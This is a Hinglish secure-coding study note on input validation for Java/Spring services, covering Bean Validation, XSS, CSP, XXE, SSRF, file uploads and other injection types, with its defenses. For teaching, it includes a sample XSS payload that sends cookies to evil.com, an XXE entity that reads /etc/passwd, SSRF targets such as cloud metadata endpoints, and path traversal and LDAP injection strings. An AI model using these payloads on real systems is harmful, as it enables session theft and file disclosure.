# Input Validation & Sanitization

## Status: Not Started

---

## Table of Contents

1. [Why Validate?](#why-validate)
2. [Server-Side Always](#server-side-always)
3. [Allow-list vs Deny-list](#allow-list-vs-deny-list)
4. [Bean Validation (Java)](#bean-validation-java)
5. [XSS — Cross-Site Scripting](#xss--cross-site-scripting)
6. [Content Security Policy (CSP)](#content-security-policy-csp)
7. [XXE — XML External Entity](#xxe--xml-external-entity)
8. [SSRF — Server-Side Request Forgery](#ssrf--server-side-request-forgery)
9. [File Upload Security](#file-upload-security)
10. [Other Injection Notes](#other-injection-notes)
11. [Summary Cheat Sheet](#summary-cheat-sheet)

---

## Why Validate?

**Matlab:** Untrusted input ko **kabhi mat trust karo** — even if frontend "validates". Frontend validation = UX, **not** security.

> Trust boundary: edge of your server.

Without validation:
- Injection (SQL, NoSQL, command, LDAP)
- XSS, XXE, SSRF
- DoS (huge payload, ReDoS)
- Business logic bypass (negative quantity, etc.)

---

## Server-Side Always

```
Browser JS:    "validate" age >= 18  → trivially bypassed (Postman, curl)
Server:        ALWAYS re-validate everything
```

### Common Mistakes

- "JS validates so I trust JSON"
- "Mobile app sanitizes" — mobile bypassable too
- "API gateway has validator" — defense in depth, but service should still validate

### Validate Where the Data Crosses Trust Boundary

```
External → API gateway → service A → service B
                ✓ validate at API edge (basic shape, types, sizes)
                ✓ service-level rules (business invariants)
```

---

## Allow-list vs Deny-list

### Deny-list (Blocklist) — ❌ Avoid

> "Block these bad characters: `'`, `;`, `<`"

Always **incomplete** — attackers find encodings, casing, alternate forms.

```
Block:  <script>
Bypass: <SCRIPT>, <ScRiPt>, <%73cript>, <iframe srcdoc=...>, ...
```

### Allow-list (Whitelist) — ✅ Prefer

> "Only allow these characters/patterns: `[a-zA-Z0-9 ]`, length 1-50"

Defines what's **valid**; everything else is invalid.

```java
// ✅
@Pattern(regexp = "^[a-zA-Z0-9_]{3,30}$")
private String username;

// ❌
if (username.contains("<") || username.contains("'")) reject;
```

---

## Bean Validation (Java)

JSR 380 / Jakarta Validation — annotations on DTOs, Spring auto-validates with `@Valid`.

### Common Annotations

```java
public class CreateUserRequest {
    @NotBlank
    @Size(min = 3, max = 30)
    @Pattern(regexp = "^[a-zA-Z0-9_]+$")
    private String username;
    
    @Email
    @NotBlank
    private String email;
    
    @Min(18) @Max(120)
    private int age;
    
    @NotNull
    @Pattern(regexp = "^(IN|US|GB|DE)$")     // allow-list of countries
    private String country;
    
    @DecimalMin("0.01")
    @DecimalMax("100000.00")
    private BigDecimal amount;
    
    @Past
    private LocalDate dateOfBirth;
    
    @URL
    private String website;
}
```

### Spring Endpoint

```java
@PostMapping("/users")
public User create(@Valid @RequestBody CreateUserRequest req) { ... }
```

If validation fails → `MethodArgumentNotValidException` → 400 Bad Request.

### Custom Validators

```java
@Documented
@Constraint(validatedBy = SafeFilenameValidator.class)
@Target({ ElementType.FIELD, ElementType.PARAMETER })
@Retention(RetentionPolicy.RUNTIME)
public @interface SafeFilename {
    String message() default "unsafe filename";
    Class<?>[] groups() default {};
    Class<? extends Payload>[] payload() default {};
}

public class SafeFilenameValidator implements ConstraintValidator<SafeFilename, String> {
    private static final Pattern SAFE = Pattern.compile("^[A-Za-z0-9._-]{1,100}$");
    public boolean isValid(String v, ConstraintValidatorContext ctx) {
        return v != null && SAFE.matcher(v).matches();
    }
}
```

### Limits — Crucial

| Field | Limit |
|-------|-------|
| String | `@Size(max=...)` always |
| Number | `@Min`/`@Max` |
| Collection | `@Size(max=...)` |
| Body size | App server config (`server.tomcat.max-http-form-post-size`) |

→ Without size limits, DoS via gigantic payloads possible.

### Validation Groups

Different rules for different operations:

```java
public class User {
    @NotNull(groups = Update.class)
    private Long id;
    
    @NotBlank(groups = { Create.class, Update.class })
    private String name;
}

@PostMapping
public void create(@Validated(Create.class) @RequestBody User u) {}

@PutMapping
public void update(@Validated(Update.class) @RequestBody User u) {}
```

---

## XSS — Cross-Site Scripting

**Matlab:** Attacker browser mein JS inject karta hai → cookies steal, actions perform as victim.

### Types

| Type | How |
|------|-----|
| **Reflected** | URL param echoed in HTML |
| **Stored** | Saved in DB, shown to other users |
| **DOM-based** | Client-side JS uses unsafe sources |

### Vulnerable Example

```html
<!-- Server templates user input directly -->
<div>Welcome, ${username}!</div>

<!-- attacker username: <script>fetch('https://evil.com/?c='+document.cookie)</script> -->
```

### Defense 1: Output Encoding (Context-Aware)

**Encode based on where data goes:**

| Context | Encode as |
|---------|-----------|
| HTML body | HTML entity (`&lt; &gt; &amp; &quot; &#39;`) |
| HTML attribute | HTML attribute encoding |
| JS string | JS string escaping |
| URL | URL percent-encoding |
| CSS | CSS escaping |

### Spring Thymeleaf (Default Auto-Escapes)

```html
<!-- Safe by default -->
<div th:text="${username}">placeholder</div>

<!-- Unsafe — attacker controls HTML -->
<div th:utext="${username}">placeholder</div>     <!-- DON'T -->
```

### React / Vue (Auto-Escape)

```jsx
// Safe — React escapes by default
<div>{username}</div>

// Unsafe
<div dangerouslySetInnerHTML={{ __html: username }} />   // beware
```

### JSON APIs

JSON itself isn't HTML. The risk: client takes JSON value and inserts into DOM unsafely. Frontend's job to escape on render. But:

- Set `Content-Type: application/json` (browsers don't render as HTML)
- Don't return JSON as `Content-Type: text/html`!

### Defense 2: Sanitize (For Allowing SOME HTML)

If you need to allow rich text (e.g., comments with bold/italic):

```java
// OWASP Java HTML Sanitizer
PolicyFactory policy = new HtmlPolicyBuilder()
    .allowElements("b", "i", "p", "br", "a")
    .allowAttributes("href").onElements("a")
    .toFactory();

String safe = policy.sanitize(userInput);
```

JS: **DOMPurify** library.

### Defense 3: HttpOnly Cookies

Cookies marked `HttpOnly` → JS can't access → XSS can't steal sessions.

```http
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
```

### Defense 4: Content Security Policy (CSP)

(Next section.)

---

## Content Security Policy (CSP)

**Matlab:** Browser ko bata do **kya allowed** hai (scripts, images, frames source). Ek **defense layer** XSS ke against.

### Header

```http
Content-Security-Policy: default-src 'self'; 
                         script-src 'self' https://cdn.jsdelivr.net; 
                         img-src 'self' data: https:; 
                         style-src 'self' 'unsafe-inline'; 
                         frame-ancestors 'none';
                         base-uri 'self';
                         form-action 'self';
```

### Common Directives

| Directive | Purpose |
|-----------|---------|
| `default-src` | Fallback for others |
| `script-src` | Where scripts load from |
| `style-src` | Stylesheets |
| `img-src` | Images |
| `connect-src` | XHR/fetch/WebSocket |
| `frame-ancestors` | Who can frame this page (clickjacking) |
| `form-action` | Where forms can submit |
| `base-uri` | `<base>` tag restrictions |
| `report-uri` / `report-to` | Where to send violation reports |

### Source Values

```
'self'                            same origin
'none'                            block all
'unsafe-inline'                   inline scripts (avoid)
'unsafe-eval'                     eval() (avoid)
https://cdn.example.com           specific domain
'nonce-abc123'                    nonce-protected inline
'sha256-...'                      hash-protected inline
```

### Modern Strict CSP

```
script-src 'self' 'nonce-{random}' 'strict-dynamic'; object-src 'none';
```

→ Per-request nonce = inline allowed only with that nonce.

### Report-Only Mode (Test First)

```http
Content-Security-Policy-Report-Only: ...; report-uri /csp-report
```

Reports violations without blocking — verify policy doesn't break site.

### Spring Security Config

```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives(
        "default-src 'self'; script-src 'self'; object-src 'none'"))
);
```

---

## XXE — XML External Entity

**Matlab:** Old XML parsers external entities resolve karte hain → attacker `file:///etc/passwd` ya internal URLs read kar sakta hai.

### Vulnerable

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

Parser dereferences → reads `/etc/passwd` → returned in response.

### Java — Disable External Entities

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// Disable DTDs entirely
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// Disable external entities
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

### SAXParserFactory / XMLInputFactory — Same Idea

OWASP cheat sheet has full list per Java parser.

### Modern Advice

- **Use JSON** when possible
- If XML required, prefer libs that are safe by default (Jackson XML, JAXB recent versions)
- **Don't accept XML at all** if you don't need it

---

## SSRF — Server-Side Request Forgery

**Matlab:** Server user-supplied URL fetch karta hai → attacker internal services / cloud metadata target karwata hai.

(Brief in OWASP file — deeper here.)

### Attack Targets

```
http://localhost:6379/                        ← Redis (no auth typical)
http://internal-admin.svc.cluster.local/      ← K8s service
http://169.254.169.254/latest/meta-data/      ← AWS IMDSv1
http://metadata.google.internal/              ← GCP
file:///etc/passwd                            ← file scheme
gopher://...                                  ← old protocol abuse
```

### Layered Defense

#### 1. Allow-list Destinations

```java
private static final Set<String> ALLOWED_HOSTS = Set.of(
    "api.partner.com", "cdn.example.com");

URI uri = URI.create(userUrl);
if (!ALLOWED_HOSTS.contains(uri.getHost())) {
    throw new ForbiddenException();
}
```

#### 2. Validate Scheme

```java
if (!"https".equalsIgnoreCase(uri.getScheme())) throw ...
```

#### 3. Resolve DNS, Block Private IPs

```java
InetAddress addr = InetAddress.getByName(uri.getHost());
if (isPrivate(addr)) throw new ForbiddenException();

private boolean isPrivate(InetAddress a) {
    return a.isAnyLocalAddress()
        || a.isLoopbackAddress()
        || a.isLinkLocalAddress()
        || a.isSiteLocalAddress()
        || a.isMulticastAddress()
        || a.getHostAddress().startsWith("169.254.")   // metadata
        || a.getHostAddress().startsWith("100.64.");   // CGN
}
```

⚠️ **DNS rebinding** — domain resolves to public first, then private second resolution. Re-resolve at connect time, or use HTTP client that respects.

#### 4. Disable Redirect Following (or re-validate target)

```java
HttpClient client = HttpClient.newBuilder()
    .followRedirects(HttpClient.Redirect.NEVER)
    .build();
```

#### 5. Network Controls

- **Egress firewall** blocks 169.254.x, 10.0.0.0/8, etc.
- **AWS IMDSv2** (token-required) kills classic metadata attack
- **VPC endpoint policies**

#### 6. Timeouts + Size Limits

```java
HttpRequest req = HttpRequest.newBuilder()
    .uri(uri)
    .timeout(Duration.ofSeconds(5))
    .build();
```

Limit response body size via streaming + abort.

---

## File Upload Security

### Risks

- Malware uploaded
- ZIP bombs (exhaust disk/CPU)
- Path traversal (`../../etc/passwd`)
- Server-executable upload (PHP shell)
- DoS via huge files

### Defenses

```java
// Limit size
spring.servlet.multipart.max-file-size: 10MB
spring.servlet.multipart.max-request-size: 10MB

// Validate extension allow-list
Set<String> ALLOWED = Set.of("jpg", "png", "pdf");

// Validate content-type via magic bytes (libs: Apache Tika)
String detected = tika.detect(bytes);   // not just trust user-provided MIME

// Random/UUID filename, never use user-supplied path
String safeName = UUID.randomUUID() + ".jpg";

// Store outside web root, serve via controller
// → never directly served as static
```

### Storage Best Practices

- **S3 / GCS / Azure Blob** with signed URLs (preferred)
- Set `Content-Disposition: attachment` for downloads (force download, not render)
- Don't reuse user's filename in URL

### Antivirus Scan

Hook ClamAV / VirusTotal API for sensitive uploads.

---

## Other Injection Notes

### LDAP Injection

```
filter = "(uid=" + user + ")"
user = "*)(|(password=*"  → injects
```

→ Use parameterized LDAP queries / library escapes.

### Path Traversal

```
GET /files?name=../../etc/passwd
```

→ Allow-list filenames, normalize path, reject `..`:

```java
Path requested = base.resolve(name).normalize();
if (!requested.startsWith(base)) throw new ForbiddenException();
```

### Template / SSTI

User input passed to template engine (Thymeleaf, Freemarker, Jinja) → arbitrary code.

→ Never compile templates from user input.

### Header Injection (CRLF)

`\r\n` in user-controlled header → splits responses.

→ Validate headers (modern frameworks usually block).

### ReDoS (Regex Denial of Service)

Catastrophic backtracking regex with malicious input takes minutes:

```
^(a+)+$   on input "aaaaaaaaaaaaaaaaaaa!"
```

→ Avoid nested quantifiers, use re2-style engine, set timeouts.

---

## Summary Cheat Sheet

| Attack | Defense |
|--------|---------|
| **SQL injection** | Parameterized queries (see `02-SQL-Injection-Prevention.md`) |
| **XSS** | Output encoding + CSP + HttpOnly cookies |
| **XXE** | Disable external entities |
| **SSRF** | Allow-list + private IP block + IMDSv2 |
| **Path traversal** | Normalize + base check |
| **Mass assignment** | DTOs (`04-Authorization-Security.md`) |
| **DoS payload** | Size limits everywhere |
| **ReDoS** | Avoid bad regex, set timeouts |

| Validation rule | Use |
|----------------|-----|
| Allow-list | Always preferred |
| `@Valid` + Bean Validation | DTO-level |
| Custom validators | Domain rules |
| Server-side | Always (frontend = UX only) |
| Type-safe parsing | Free check (Long, UUID, enum) |

| Output encoding | Where |
|----------------|-------|
| HTML body | Auto by Thymeleaf/React |
| HTML attribute | Specific encoder |
| JS string | Specific encoder |
| URL | `URLEncoder` |

---

## Practice

1. Add `@Valid` + Bean Validation to all DTOs in your service.
2. Audit all `@RequestParam` / `@PathVariable` — are types strict (Long, UUID, enum) instead of String?
3. Set `Content-Security-Policy` (Report-Only first) on your frontend.
4. Disable XXE in any XML parsing your app does (run a check).
5. Build a safe URL fetcher utility (allow-list + private IP block).
6. Add file upload with size limit, MIME detection (Tika), and UUID filename.
